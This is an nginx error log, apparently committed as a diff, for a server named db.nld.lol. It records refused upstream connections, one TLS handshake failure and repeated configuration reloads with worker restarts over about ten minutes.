+2023/05/05 22:16:09 [error] 59#59: *213 connect() failed (111: Connection refused) while connecting to upstream, client: 216.173.111.23, server: db.nld.lol, request: "GET / HTTP/1.1", upstream: "https://192.168.48.7:8080/", host: "db.nld.lol"
+2023/05/05 22:16:39 [error] 59#59: *226 connect() failed (111: Connection refused) while connecting to upstream, client: 154.92.114.9, server: db.nld.lol, request: "GET / HTTP/1.1", upstream: "https://192.168.48.7:8080/", host: "db.nld.lol"
+2023/05/05 22:17:13 [notice] 60#60: signal process started
+2023/05/05 22:17:13 [notice] 1#1: signal 1 (SIGHUP) received from 60, reconfiguring
+2023/05/05 22:17:13 [notice] 1#1: reconfiguring
+2023/05/05 22:17:13 [notice] 1#1: using the "epoll" event method
+2023/05/05 22:17:13 [notice] 1#1: start worker processes
+2023/05/05 22:17:13 [notice] 1#1: start worker process 65
+2023/05/05 22:17:13 [notice] 59#59: gracefully shutting down
+2023/05/05 22:17:14 [crit] 59#59: *237 SSL_do_handshake() failed (SSL: error:14201044:SSL routines:tls_choose_sigalg:internal error) while SSL handshaking, client: 95.216.188.234, server: 0.0.0.0:443
+2023/05/05 22:17:16 [notice] 59#59: exiting
+2023/05/05 22:17:16 [notice] 59#59: exit
+2023/05/05 22:17:16 [notice] 1#1: signal 17 (SIGCHLD) received from 59
+2023/05/05 22:17:16 [notice] 1#1: worker process 59 exited with code 0
+2023/05/05 22:17:16 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 22:19:59 [notice] 66#66: signal process started
+2023/05/05 22:19:59 [notice] 1#1: signal 1 (SIGHUP) received from 66, reconfiguring
+2023/05/05 22:19:59 [notice] 1#1: reconfiguring
+2023/05/05 22:19:59 [notice] 1#1: using the "epoll" event method
+2023/05/05 22:19:59 [notice] 1#1: start worker processes
+2023/05/05 22:19:59 [notice] 1#1: start worker process 71
+2023/05/05 22:19:59 [notice] 65#65: gracefully shutting down
+2023/05/05 22:19:59 [notice] 65#65: exiting
+2023/05/05 22:19:59 [notice] 65#65: exit
+2023/05/05 22:19:59 [notice] 1#1: signal 17 (SIGCHLD) received from 65
+2023/05/05 22:19:59 [notice] 1#1: worker process 65 exited with code 0
+2023/05/05 22:19:59 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 22:24:12 [notice] 72#72: signal process started
+2023/05/05 22:24:12 [notice] 1#1: signal 1 (SIGHUP) received from 72, reconfiguring
+2023/05/05 22:24:12 [notice] 1#1: reconfiguring
+2023/05/05 22:24:12 [notice] 1#1: using the "epoll" event method
+2023/05/05 22:24:12 [notice] 1#1: start worker processes
+2023/05/05 22:24:12 [notice] 1#1: start worker process 78
+2023/05/05 22:24:12 [notice] 71#71: gracefully shutting down
+2023/05/05 22:24:12 [notice] 71#71: exiting
+2023/05/05 22:24:12 [notice] 71#71: exit
+2023/05/05 22:24:12 [notice] 1#1: signal 17 (SIGCHLD) received from 71
+2023/05/05 22:24:12 [notice] 1#1: worker process 71 exited with code 0
+2023/05/05 22:24:12 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 22:25:04 [notice] 79#79: signal process started
+2023/05/05 22:25:04 [notice] 1#1: signal 1 (SIGHUP) received from 79, reconfiguring
+2023/05/05 22:25:04 [notice] 1#1: reconfiguring
+2023/05/05 22:25:04 [notice] 1#1: using the "epoll" event method
+2023/05/05 22:25:04 [notice] 1#1: start worker processes
+2023/05/05 22:25:04 [notice] 1#1: start worker process 84
+2023/05/05 22:25:04 [notice] 78#78: gracefully shutting down
+2023/05/05 22:25:04 [notice] 78#78: exiting
+2023/05/05 22:25:04 [notice] 78#78: exit
+2023/05/05 22:25:04 [notice] 1#1: signal 17 (SIGCHLD) received from 78
+2023/05/05 22:25:04 [notice] 1#1: worker process 78 exited with code 0
+2023/05/05 22:25:04 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 22:27:58 [notice] 85#85: signal process started
+2023/05/05 22:27:58 [notice] 1#1: signal 1 (SIGHUP) received from 85, reconfiguring
+2023/05/05 22:27:58 [notice] 1#1: reconfiguring
+2023/05/05 22:27:58 [notice] 1#1: using the "epoll" event method
+2023/05/05 22:27:58 [notice] 1#1: start worker processes
+2023/05/05 22:27:58 [notice] 1#1: start worker process 90
+2023/05/05 22:27:59 [notice] 84#84: gracefully shutting down
+2023/05/05 22:27:59 [notice] 84#84: exiting
+2023/05/05 22:27:59 [notice] 84#84: exit
+2023/05/05 22:27:59 [notice] 1#1: signal 17 (SIGCHLD) received from 84
+2023/05/05 22:27:59 [notice] 1#1: worker process 84 exited with code 0
+2023/05/05 22:27:59 [notice] 1#1: signal 29 (SIGIO) received
